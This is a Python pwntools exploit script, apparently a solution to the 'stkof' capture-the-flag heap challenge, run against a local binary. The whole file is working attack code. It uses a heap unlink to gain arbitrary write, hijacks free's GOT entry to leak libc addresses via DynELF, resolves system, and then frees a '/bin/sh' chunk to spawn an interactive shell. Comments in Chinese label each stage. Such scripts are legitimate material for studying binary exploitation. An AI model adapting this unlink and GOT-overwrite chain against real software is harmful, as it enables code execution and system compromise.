#-*- coding:utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p = process('./stkof')
elf = ELF('./stkof')

free_got = elf.got['free']
puts = elf.symbols['puts']

def add(size):
	p.sendline('1')
	p.sendline(str(size))
	p.recvuntil('OK\n')

def set(index, content):
	p.sendline('2')
	p.sendline(str(index))
	p.sendline(str(len(content)))
	p.send(content)
	p.recvuntil('\n')	

def delete(index):
	p.sendline('3')
	p.sendline(str(index))

def leak(addr):
	payload = p64(0)*3 + p64(0x602130) + p64(addr)
	set(1, payload)
	delete(2)
	res = p.recvuntil('OK\n').split('\x0aOK')[0]
	if res == '':
		res = '\x00'
	return res #返回值可以为任意长度，并不清楚原因

chunk_ptr = 0x602148

add(0x80)
add(0x80)
add(0x80)
add(0x80)

#unlink
payload = p64(0) + p64(0x80) 
payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)
payload += 'a' * 0x60
payload += p64(0x80) + p64(0x90)
set(1, payload)
delete(2)
p.recvuntil('OK\n')


#freegot写为puts
payload = p64(0)*3 + p64(0x602130) + p64(free_got)
set(1, payload)
set(2, p64(puts))

#leak
d = DynELF(leak, elf = elf)
system = d.lookup('system', 'libc')
print "system addr: %#x" % system

#freegot写为system
payload = p64(0)*3 + p64(0x602130) + p64(free_got)
set(1, payload)
set(2, p64(system))

#getshell
set(3, '/bin/sh\x00')
delete(3)

p.interactive()


